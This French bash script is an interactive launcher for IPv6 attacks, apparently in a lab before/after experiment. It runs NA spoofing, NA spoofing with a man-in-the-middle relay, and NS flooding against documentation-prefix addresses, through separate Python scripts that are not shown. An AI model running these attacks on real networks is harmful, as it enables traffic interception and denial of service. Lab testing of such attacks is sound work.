#!/bin/bash
# attaques/lancer.sh — Lanceur interactif pour les attaques IPv6

DIR="$(cd "$(dirname "$0")" && pwd)"

echo "=== MENU ATTAQUES IPv6 ==="
echo "  1) NA Spoofing (empoisonnement simple)"
echo "  2) NA Spoofing + MITM (empoisonnement + relais routeur)"
echo "  3) NS Flood (saturation du cache de voisins)"
echo "  0) Quitter"
read -p "Choix [1/2/3/0] : " choix

[ "$choix" = "0" ] || [ -z "$choix" ] && exit 0

# Appuyer sur Entrée garde la valeur par défaut entre crochets
read -p "Phase (avant/apres) [avant] : " phase
phase=${phase:-avant}

read -p "Numéro d'essai [1] : " essai
essai=${essai:-1}

read -p "Interface (eth1 dans le lab, lo en test) [eth1] : " iface
iface=${iface:-eth1}

read -p "Durée en secondes [15] : " duree
duree=${duree:-15}

read -p "Mode test --dry-run ? (o/n) [n] : " dry
OPT_DRY=""
[ "$dry" = "o" ] && OPT_DRY="--dry-run"

case "$choix" in
    1)
        python3 "$DIR/na_spoof.py" --iface "$iface" --phase "$phase" --essai "$essai" \
            --routeur-ip 2001:db8:10:10::1 --victime-ip 2001:db8:10:10::10 \
            --mode poison --duree "$duree" --silencieux $OPT_DRY
        ;;
    2)
        read -p "MAC réelle du routeur [02:42:ac:11:00:02] : " rmac
        rmac=${rmac:-02:42:ac:11:00:02}
        python3 "$DIR/na_spoof.py" --iface "$iface" --phase "$phase" --essai "$essai" \
            --routeur-ip 2001:db8:10:10::1 --victime-ip 2001:db8:10:10::10 \
            --mode mitm --routeur-mac "$rmac" --duree "$duree" --silencieux $OPT_DRY
        ;;
    3)
        python3 "$DIR/ns_flood.py" --iface "$iface" --phase "$phase" --essai "$essai" \
            --prefixe 2001:db8:10:10::/64 --nb-adresses 2000 --debit 200 \
            --duree "$duree" --ping-cible 2001:db8:10:10::1 --silencieux $OPT_DRY
        ;;
    *)
        echo "Choix invalide."
        exit 1
        ;;
esac